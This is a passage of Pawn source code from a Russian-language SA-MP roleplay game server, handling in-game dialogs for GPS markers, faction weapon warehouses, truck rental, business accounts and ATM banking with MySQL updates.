            format(string, 300, "{AE443D}'%s' {FFFFFF}помечано на карте красной меткой. Дистанция: {AE433D}%.1f {FFFFFF}метров", farm_info[listitem][gps_t], GetPlayerDistanceFromPoint(playerid, farm_info[listitem][gps_x], farm_info[listitem][gps_y], farm_info[listitem][gps_z]));
			SCM(playerid, -1, string);
		}
	case 8030:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Отмена");
			switch(listitem)
			{
			case 0: SetPlayerRaceCheckpoint(playerid,1, 692.6858,-477.6270,16.3359,0,0,0,2);
			case 1: SetPlayerRaceCheckpoint(playerid,1, -2105.0916,-2490.5391,30.6250,0,0,0,2);
			case 2: SetPlayerRaceCheckpoint(playerid,1, 656.0513,1723.5275,6.9922,0,0,0,2);
			}
			CP[playerid] = 776;
            format(string, 300, "{AE443D}'%s' {FFFFFF}помечано на карте красной меткой. Дистанция: {AE433D}%.1f {FFFFFF}метров", bikes_info[listitem][gps_t], GetPlayerDistanceFromPoint(playerid, bikes_info[listitem][gps_x], bikes_info[listitem][gps_y], bikes_info[listitem][gps_z]));
			SCM(playerid, -1, string);
		}
	case 8031:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Отмена");
			switch(listitem)
			{
			case 0: SetPlayerRaceCheckpoint(playerid,1, 2601.7473,-2226.6167,13.3735,0,0,0,2);
			case 1: SetPlayerRaceCheckpoint(playerid,1, -1731.3489,118.6924,3.5547,0,0,0,2);
			case 3: SetPlayerRaceCheckpoint(playerid,1, 256.2961,1414.4734,10.7075,0,0,0,2);
			case 4: SetPlayerRaceCheckpoint(playerid,1, -1046.8383,-670.5345,32.3516,0,0,0,2);
			case 5: SetPlayerRaceCheckpoint(playerid,1, 608.5809,847.9885,-43.1515,0,0,0,2);
			case 6: SetPlayerRaceCheckpoint(playerid,1, -1873.1827,-1720.1915,21.7500,0,0,0,2);
			case 7: SetPlayerRaceCheckpoint(playerid,1, -1978.7343,-2434.5264,30.63,0,0,0,2);
			case 8: SetPlayerRaceCheckpoint(playerid,1, -1977.6138,-2442.2051,30.6250,0,0,0,2);
			case 9: SetPlayerRaceCheckpoint(playerid,1, 2353.2612,2719.6458,10.7217,0,0,0,2);
			}
			CP[playerid] = 776;
            format(string, 300, "{AE443D}'%s' {FFFFFF}помечано на карте красной меткой. Дистанция: {AE433D}%.1f {FFFFFF}метров", trucker_info[listitem][gps_t], GetPlayerDistanceFromPoint(playerid, trucker_info[listitem][gps_x], trucker_info[listitem][gps_y], trucker_info[listitem][gps_z]));
			SCM(playerid, -1, string);
		}
	case 8032:
		{
			if(!response) return ShowPlayerDialogEx(playerid, 8001, DIALOG_STYLE_LIST, "GPS", "[0] Важные\n[1] По работе\n[2] Бизнесы\n[3] Магазины\n[4] Базы организаций\n[5] Фермы\n[6] Дальнобойщики\n[7] Клубы байкеров\n[8] СТО", "Выбрать", "Отмена");
			switch(listitem)
			{
			case 0: SetPlayerRaceCheckpoint(playerid,1, 844.5269,-592.0873,17.8798,0,0,0,2);
			case 1: SetPlayerRaceCheckpoint(playerid,1, -1799.2909,1198.1625,25.1194,0,0,0,2);
			case 2: SetPlayerRaceCheckpoint(playerid,1, 1659.0791,2195.0078,10.8203,0,0,0,2);
			}
			CP[playerid] = 776;
            format(string, 300, "{AE443D}'%s' {FFFFFF}помечано на карте красной меткой. Дистанция: {AE433D}%.1f {FFFFFF}метров", sto_info[listitem][gps_t], GetPlayerDistanceFromPoint(playerid, sto_info[listitem][gps_x], sto_info[listitem][gps_y], sto_info[listitem][gps_z]));
			SCM(playerid, -1, string);
		}
	case 2019:
		{
			if(response)
			{
				switch(listitem)
				{
				case 0:
					{
						if(wmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 24; ammo = 50; wmcmatbi -= 70;
					}
				case 1:
					{
						if(wmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 25; ammo = 15; wmcmatbi -= 50;
					}
				case 2:
					{
						if(wmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 33; ammo = 10; wmcmatbi -= 100;
					}
				case 3:
					{
						if(wmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 31; ammo = 100; wmcmatbi -= 500;
					}
				case 4:
					{
						if(wmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 30; ammo = 100; wmcmatbi -= 500;
					}
				case 5:
					{
						if(wmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 29; ammo = 200; wmcmatbi -= 400;
					}
				case 6:
					{
						if(wmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 23; ammo = 100; wmcmatbi -= 100;
					}
				}
				new sendername[MAX_PLAYER_NAME];
				GetWeaponName(gun, gunname, sizeof(gunname));
				if(booston == 0) GiveWeapon(playerid, gun, ammo);
				else if(booston == 1) GiveWeapon(playerid, gun, ammo*3);
				format(string, 256, " Вы взяли оружие со склада");
				SCM(playerid, COLOR_BLUE, string);
				GetPlayerName(playerid,sendername,sizeof(sendername));
				format(string, 144, " %s взял(а) оружие со склада", sendername);
				ProxDetector(20.0, playerid, string,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}
			else
			{
				return true;
			}
		}
	case 2022:
		{
			if(response)
			{
				switch(listitem)
				{
				case 0:
					{
						if(pmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 24; ammo = 50; pmcmatbi -= 70;
					}
				case 1:
					{
						if(pmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 25; ammo = 15; pmcmatbi -= 50;
					}
				case 2:
					{
						if(pmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 33; ammo = 10; pmcmatbi -= 100;
					}
				case 3:
					{
						if(pmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 31; ammo = 100; pmcmatbi -= 500;
					}
				case 4:
					{
						if(pmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 30; ammo = 100; pmcmatbi -= 500;
					}
				case 5:
					{
						if(pmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 29; ammo = 200; pmcmatbi -= 400;
					}
				case 6:
					{
						if(pmcmatbi <= 50)  return  SCM(playerid,COLOR_GRAD1, " На складе нет материалов!");
						gun = 23; ammo = 100; pmcmatbi -= 100;
					}
				}
				new sendername[MAX_PLAYER_NAME];
				GetWeaponName(gun, gunname, sizeof(gunname));
				if(booston == 0) GiveWeapon(playerid, gun, ammo);
				else if(booston == 1) GiveWeapon(playerid, gun, ammo*3);
				format(string, 256, " Вы взяли оружие со склада");
				SCM(playerid, COLOR_BLUE, string);
				GetPlayerName(playerid,sendername,sizeof(sendername));
				format(string, 144, " %s взял(а) оружие со склада", sendername);
				ProxDetector(20.0, playerid, string,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				return true;
			}
			else
			{
				return true;
			}
		}
	case 32000:
		{
			if(response)
			{
				new car = GetPlayerVehicleID(playerid);
				if(car >= PetrolTanker[0] && car <= PetrolTanker[5])
				{
					if(PlayerInfo[playerid][pDLevel] >= 14)
					{
						if(PlayerInfo[playerid][pCash] <= 15000)
						{
							SCM(playerid, COLOR_GREY, " Не достаточно денег");
							RemovePlayerFromVehicleAC(playerid);
							TogglePlayerControllable(playerid, 1);
							return true;
						}
						else
						{
							jobcar[car] = true;
							PlayerInfo[playerid][pCash] -= 15000;
							TogglePlayerControllable(playerid, 1);
							SCM(playerid, -1, " Вы арендовали транспортное средство");
							return true;
						}
					}
					else
					{
						SCM(playerid, COLOR_GREY, " Для этого транспорта требуется 15 уровень скилла");
						RemovePlayerFromVehicleAC(playerid);
						TogglePlayerControllable(playerid, 1);
					}
				}
				else if(car >= Tanker[0] && car <= Tanker[11])
				{
					if(PlayerInfo[playerid][pDLevel] >= 0)
					{
						if(PlayerInfo[playerid][pCash] < 5000)
						{
							SCM(playerid, COLOR_GREY, " Не достаточно денег");
							RemovePlayerFromVehicleAC(playerid);
							TogglePlayerControllable(playerid, 1);
							return true;
						}
						else
						{
							jobcar[car] = true;
							PlayerInfo[playerid][pCash] -= 5000;
							TogglePlayerControllable(playerid, 1);
							SCM(playerid, -1, " Вы арендовали транспортное средство");
							return true;
						}
					}
				}
				else if(car >= Linerunner[0] && car <= Linerunner[1])
				{
					if(PlayerInfo[playerid][pDLevel] >= 4)
					{
						if(PlayerInfo[playerid][pCash] < 10000)
						{
							SCM(playerid, COLOR_GREY, " Не достаточно денег");
							RemovePlayerFromVehicleAC(playerid);
							TogglePlayerControllable(playerid, 1);
							return true;
						}
						else
						{
							jobcar[car] = true;
							PlayerInfo[playerid][pCash] -= 10000;
							TogglePlayerControllable(playerid, 1);
							SCM(playerid, -1, " Вы арендовали транспортное средство");
							return true;
						}
					}
					else
					{
						SCM(playerid, COLOR_GREY, " Для этого транспорта требуется 5 уровень скилла");
						RemovePlayerFromVehicleAC(playerid);
						TogglePlayerControllable(playerid, 1);
					}
				}
				else if(car >= Roadtrain[0] && car <= Roadtrain[5])
				{
					if(PlayerInfo[playerid][pDLevel] > 24)
					{
						if(PlayerInfo[playerid][pCash] < 20000)
						{
							SCM(playerid, COLOR_GREY, " Не достаточно денег");
							RemovePlayerFromVehicleAC(playerid);
							TogglePlayerControllable(playerid, 1);
							return true;
						}
						else
						{
							jobcar[car] = true;
							PlayerInfo[playerid][pCash] -= 20000;
							TogglePlayerControllable(playerid, 1);
							SCM(playerid, -1, " Вы арендовали транспортное средство");
							return true;
						}
					}
					else
					{
						SCM(playerid, COLOR_GREY, " Для этого транспорта требуется 25 уровень скилла");
						RemovePlayerFromVehicleAC(playerid);
						TogglePlayerControllable(playerid, 1);
					}
				}
				return true;
			}
			else
			{
				RemovePlayerFromVehicleAC(playerid);
				TogglePlayerControllable(playerid, 1);
				return true;
			}
		}
	case 2929:
		{
			if(response)
			{
				new bouse = PlayerInfo[playerid][pPBizzKey];
				if(!strlen(inputtext))return ShowPlayerDialogEx(playerid,2929,DIALOG_STYLE_INPUT, "Перевод денег на счёт бизнеса","Введите сумму, которую вы хотите положить на счёт бизнеса", "Готово", "Отмена");
				new moneys;
				moneys = strval(inputtext);
				if(moneys < 1000 || moneys > 1000000)
				{
					SCM(playerid, COLOR_GREY, " Минимальная сумма 1000 вирт, максимальная 1000000 вирт");
					ShowPlayerDialogEx(playerid,2929,DIALOG_STYLE_INPUT, "Перевод денег на счёт бизнеса","Введите сумму, которую вы хотите положить на счёт бизнеса", "Готово", "Отмена");
					return true;
				}
				if(moneys+BizzInfo[bouse][bTill] > 55000) return SCM(playerid,COLOR_GREY," Неверная сумма");
				if(PlayerInfo[playerid][pBank] < moneys) return	SCM(playerid, COLOR_GRAD1, " У вас нет столько денег!");
				PlayerInfo[playerid][pBank] -= moneys;
				BizzInfo[bouse][bTill] += moneys;
				format(string, 144, "Вы положили на счёт Вашего бизнеса %i вирт", moneys);
				SCM(playerid, 0x6495EDFF, string);
				SetPlayerChatBubble(playerid, "Кладёт на счёт бизнеса",COLOR_PURPLE,30.0,10000);
				return true;
			}
			else
			{
				return true;
			}
		}
	case 8900:
		{
			if(!response) return GameTextForPlayer(playerid,"~g~good luck",1000,1);
			switch(listitem)
			{
			case 0:
			{
			    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			case 1: return ShowPlayerDialogEx(playerid, 8905, DIALOG_STYLE_INPUT, "{FFFFFF}Снять со счёта | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите снять с личного счёта:", "Выбрать", "Назад");
			case 2: return ShowPlayerDialogEx(playerid, 8904, DIALOG_STYLE_INPUT, "{FFFFFF}Положить на счёт | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите положить на личный счёт:", "Выбрать", "Назад");
			case 3:
			{
				    if(!HGet(playerid))
					{
					    SCM(playerid,COLOR_GREY," У вас отсутствует частное имущество");
					    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
						[1] Снять со счёта\n\
						[2] Положить на счёт\n\
						[3] Оплатить кварплату наличными\n\
						[4] Оплатить кварплату со счёта\n\
						[5] Перевести игроку с наличных\n\
						[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
						ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
						return true;
					}
					format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[6] 7 дней\t\t\t\t\t%i вирт\n[7] 14 дней\t\t\t\t\t%i вирт\n[8] 28 дней\t\t\t\t\t%i вирт",
					GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
					ShowPlayerDialogEx(playerid,9521,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату наличными | {AE433D}Банкомат",string, "Выбрать", "Назад");
             }
			 case 4:
			 {
                if(!HGet(playerid))
				{
				    SCM(playerid,COLOR_GREY," У вас отсутствует частное имущество");
				    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
					[1] Снять со счёта\n\
					[2] Положить на счёт\n\
					[3] Оплатить кварплату наличными\n\
					[4] Оплатить кварплату со счёта\n\
					[5] Перевести игроку с наличных\n\
					[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
					ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
					return true;
				}
				format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[6] 7 дней\t\t\t\t\t%i вирт\n[7] 14 дней\t\t\t\t\t%i вирт\n[8] 28 дней\t\t\t\t\t%i вирт",
				GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
                ShowPlayerDialogEx(playerid,9522,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату банком | {AE433D}Банкомат",string, "Выбрать", "Назад");
			 }
			 case 5: return ShowPlayerDialogEx(playerid, 8906, DIALOG_STYLE_INPUT, "{FFFFFF}Перевести игроку с наличных | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите передать и имя игрока через пробел\n\nПример: ''212121 Ioan_Grozny''", "Выбрать", "Назад");
			 case 6: return ShowPlayerDialogEx(playerid, 8907, DIALOG_STYLE_INPUT, "{FFFFFF}Перевести игроку со счёта | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите передать и имя игрока через пробел\n\nПример: ''212121 Ioan_Grozny''", "Выбрать", "Назад");
			}
		}
	case 8906:
	    {
            if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			if(!(1 <= strval(inputtext) <= 99999999999)) return ShowPlayerDialogEx(playerid, 8906, DIALOG_STYLE_INPUT, "{FFFFFF}Перевести игроку с наличных | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите передать и имя игрока через пробел\n\nПример: ''212121 Ioan_Grozny''", "Выбрать", "Назад");
	    }
 case 8907:
		{
		    if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			if(!(1 <= strval(inputtext) <= 99999999999)) return ShowPlayerDialogEx(playerid, 8907, DIALOG_STYLE_INPUT, "{FFFFFF}Перевести игроку со счёта | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите передать и имя игрока через пробел\n\nПример: ''212121 Ioan_Grozny''", "Выбрать", "Назад");
		}
	case 8904:
		{
			if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
		    if(!(1 <= strval(inputtext) <= 99999999999)) return ShowPlayerDialogEx(playerid, 8904, DIALOG_STYLE_INPUT, "{FFFFFF}Положить на счёт | {AE433D}Банкомат","{FFFFFF}Введите сумму которую хотите положить на личный счёт:", "Выбрать", "Назад");
            if(!strlen(inputtext)) return ShowPlayerDialogEx(playerid, 8904, DIALOG_STYLE_INPUT, "{FFFFFF}Положить на счёт | {AE433D}Банкомат","{FFFFFF}Введите сумму которую хотите положить на личный счёт:", "Выбрать", "Назад");
			if(PlayerInfo[playerid][pCash] < strval(inputtext))
			{
			    SCM(playerid,COLOR_GREY," Недостаточно средств на руках");
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			PlayerInfo[playerid][pCash]-=strval(inputtext);
			PlayerInfo[playerid][pBank]+=strval(inputtext);
			format(string,15,"~r~-$%i",strval(inputtext));
			GameTextForPlayer(playerid,string,1000,1);
			SendMes(playerid,0x6495EDFF," Вы пополнили счет на %i вирт. Баланс: %i вирт",strval(inputtext),PlayerInfo[playerid][pBank]);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i', pBank = '%i'WHERE name = '%e'", PlayerInfo[playerid][pCash], PlayerInfo[playerid][pBank], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
			return ShowPlayerDialogEx(playerid, 8904, DIALOG_STYLE_INPUT, "{FFFFFF}Положить на счёт | {AE433D}Банкомат","{FFFFFF}Введите сумму которую хотите положить на личный счёт:", "Выбрать", "Назад");
		}
	case 8905:
		{
			if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
            if(!(1 <= strval(inputtext) <= 99999999999)) return ShowPlayerDialogEx(playerid, 8905, DIALOG_STYLE_INPUT, "{FFFFFF}Снять со счёта | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите снять с личного счёта:", "Выбрать", "Назад");
			if(PlayerInfo[playerid][pBank] < strval(inputtext))
			{
                SCM(playerid,COLOR_GREY," Недостаточно средств на банковском счету");
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			PlayerInfo[playerid][pBank]-=strval(inputtext);
			PlayerInfo[playerid][pCash]+=strval(inputtext);
			format(string,15,"~b~+$%i",strval(inputtext));
			GameTextForPlayer(playerid,string,1000,1);
			SendMes(playerid,0x6495edff," Вы сняли со счета %i вирт. Баланс: %i вирт",strval(inputtext),PlayerInfo[playerid][pBank]);
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i', pCash = '%i'WHERE name = '%e'", PlayerInfo[playerid][pBank], PlayerInfo[playerid][pCash], PlayerInfo[playerid][pName]);
            mysql_function_query(DATABASE,QUERY,false,"","");
			return ShowPlayerDialogEx(playerid, 8905, DIALOG_STYLE_INPUT, "{FFFFFF}Снять со счёта | {AE433D}Банкомат","{FFFFFF}Введите сумму, которую хотите снять с личного счёта:", "Выбрать", "Назад");
		}
	case 9521:
		{
		    if(!response)
			{
                format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			if(!HGet(playerid))
			{
			    SCM(playerid,COLOR_GREY," У вас отсутствует частное имущество");
			    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			switch(listitem)
			{
			case 0: SetPVarInt(playerid,"Housemoney",1);
			case 1: SetPVarInt(playerid,"Housemoney",3);
			case 2: SetPVarInt(playerid,"Housemoney",5);
			case 3: SetPVarInt(playerid,"Housemoney",12);
			case 4: SetPVarInt(playerid,"Housemoney",24);
			case 5: SetPVarInt(playerid,"Housemoney",72);
			case 6: SetPVarInt(playerid,"Housemoney",168);
			case 7: SetPVarInt(playerid,"Housemoney",336);
			case 8: SetPVarInt(playerid,"Housemoney",672);
			}
			new moneys = (GetPVarInt(playerid,"Housemoney")*GetHouseOplata(PlayerInfo[playerid][pPHouseKey]));
			if(PlayerInfo[playerid][pCash] < moneys)
			{
			    SCM(playerid,COLOR_GREY," Недостаточно средств на руках");
			    format(string, 300, "{FFFFFF}[0] Баланс: $%i\n\
				[1] Снять со счёта\n\
				[2] Положить на счёт\n\
				[3] Оплатить кварплату наличными\n\
				[4] Оплатить кварплату со счёта\n\
				[5] Перевести игроку с наличных\n\
				[6] Перевести игроку со счёта", PlayerInfo[playerid][pBank]);
				ShowPlayerDialogEx(playerid, 8900, DIALOG_STYLE_LIST, "{FFFFFF}Меню | {AE433D}Банкомат", string, "Далее", "Выйти");
				return true;
			}
			if(HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]+moneys > GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672+1) {
			SendMes(playerid,COLOR_GREY," Вы не можете пополнить домашний счет выше, чем на %i вирт. Ваш баланс: %i вирт",GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672,HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]);
			format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[1] 7 дней\t\t\t\t\t%i вирт\n[1] 14 дней\t\t\t\t\t%i вирт\n[1] 28 дней\t\t\t\t\t%i вирт",
			GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
			ShowPlayerDialogEx(playerid,9521,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату наличными | {AE433D}Банкомат",string, "Выбрать", "Назад"); return true;}
			HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]+=moneys;
			PlayerInfo[playerid][pCash]-= moneys;
			FracBank[0][fKazna]+=moneys/2;
			SendMes(playerid,COLOR_BLUE," Вы перевели наличными %i вирт. Остаток: %i вирт. Домашний счёт %i вирт",moneys,PlayerInfo[playerid][pCash],HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings]);
			format(string,512,"[0] 1 час\t\t\t\t\t%i вирт\n[1] 3 часа\t\t\t\t\t%i вирт\n[2] 5 часов\t\t\t\t\t%i вирт\n[3] 12 часов\t\t\t\t\t%i вирт\n[4] 24 часа\t\t\t\t\t%i вирт\n[5] 3 дня\t\t\t\t\t%i вирт\n[6] 7 дней\t\t\t\t\t%i вирт\n[7] 14 дней\t\t\t\t\t%i вирт\n[8] 28 дней\t\t\t\t\t%i вирт",
			GetHouseOplata(PlayerInfo[playerid][pPHouseKey]),GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*3,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*5,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*12,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*24,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*72,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*168,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*336,GetHouseOplata(PlayerInfo[playerid][pPHouseKey])*672);
			ShowPlayerDialogEx(playerid,9521,DIALOG_STYLE_LIST, "{FFFFFF}Оплатить квартплату наличными | {AE433D}Банкомат",string, "Выбрать", "Назад");
			PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
			DeletePVar(playerid,"Housemoney");

			mysql_format(DATABASE,QUERY,300, "UPDATE `"TABLE_HOUSE"` SET hTakings = '%i' WHERE hID = '%d'", HouseInfo[PlayerInfo[playerid][pPHouseKey]][hTakings], playerid);
